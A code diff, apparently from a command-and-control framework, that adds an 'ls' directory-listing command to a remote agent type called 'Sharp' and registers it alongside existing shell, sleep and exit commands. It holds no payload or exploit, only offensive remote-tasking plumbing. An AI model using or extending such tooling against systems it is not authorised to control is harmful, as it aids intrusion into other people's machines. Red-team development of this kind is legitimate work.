@@ -80,7 +80,31 @@ class CommandSleep(Command):
         #packer.add_data(commands)
         packer.add_data("sleep "+arguments["sleeptime"])
         return packer.buffer
+class CommandLs(Command):
+    Name        = "ls"
+    Description = "List directories"
+    Help = "Example: ls C:\\"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="path",
+            is_file_path=False,
+            is_optional=True
+        )
+    ]
 
+    def job_generate(self, arguments: dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+
+        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
+        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
+
+        #commands = "/C " + arguments["commands"]
+        #packer.add_data(commands)
+        packer.add_data("ls "+arguments["path"])
+        return packer.buffer
 class Sharp(AgentType):
     Name = "Sharp"
     Author = "@smallbraintranman"
@@ -132,6 +156,7 @@ class Sharp(AgentType):
         CommandShell(),
         CommandExit(),
         CommandSleep(),
+        CommandLs(),
     ]
 
     def generate( self, config: dict ) -> None:
